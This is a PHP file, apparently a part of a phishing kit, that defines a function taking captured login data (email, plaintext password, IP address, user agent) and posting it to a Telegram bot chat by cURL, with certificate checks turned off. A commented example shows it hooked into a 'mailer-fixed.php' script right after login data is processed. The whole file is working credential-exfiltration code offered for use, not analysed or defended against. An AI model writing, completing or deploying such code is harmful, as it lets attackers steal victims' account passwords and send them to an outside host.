<?php
// Telegram Webhook for Real-time Notifications
// This script can be included in mailer-fixed.php to send notifications in real-time

/**
 * Send a notification to Telegram when new login data is received
 * 
 * @param string $botToken Telegram Bot Token
 * @param string $chatId Telegram Chat ID
 * @param array $data Login data to send
 * @return bool Success status
 */
function sendTelegramNotification($botToken, $chatId, $data) {
    // Validate required parameters
    if (empty($botToken) || empty($chatId) || empty($data)) {
        error_log("Telegram notification error: Missing required parameters");
        return false;
    }
    
    // Format the message
    $message = "🔔 <b>New Login Data Received</b>\n\n";
    
    // Add login details
    if (isset($data['email'])) {
        $message .= "📧 <b>Email:</b> " . htmlspecialchars($data['email']) . "\n";
    }
    
    if (isset($data['password'])) {
        $message .= "🔑 <b>Password:</b> " . htmlspecialchars($data['password']) . "\n";
    }
    
    // Add IP and User Agent
    if (isset($data['ip'])) {
        $message .= "🌐 <b>IP Address:</b> " . htmlspecialchars($data['ip']) . "\n";
    }
    
    if (isset($data['user_agent'])) {
        $message .= "💻 <b>User Agent:</b> " . htmlspecialchars($data['user_agent']) . "\n";
    }
    
    // Add timestamp
    $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    
    // Prepare the API request
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    // Use cURL to send the request
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10 seconds timeout
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Check for success
    if ($httpCode == 200) {
        $responseData = json_decode($response, true);
        if (isset($responseData['ok']) && $responseData['ok'] === true) {
            return true;
        }
    }
    
    // Log error
    error_log("Telegram notification error: HTTP Code {$httpCode}, Error: {$error}, Response: {$response}");
    return false;
}

/**
 * Example usage in mailer-fixed.php:
 * 
 * // After successfully processing login data
 * if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID')) {
 *     include_once 'telegram_webhook.php';
 *     sendTelegramNotification(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, [
 *         'email' => $email,
 *         'password' => $password,
 *         'ip' => $ip,
 *         'user_agent' => $user_agent
 *     ]);
 * }
 */
?>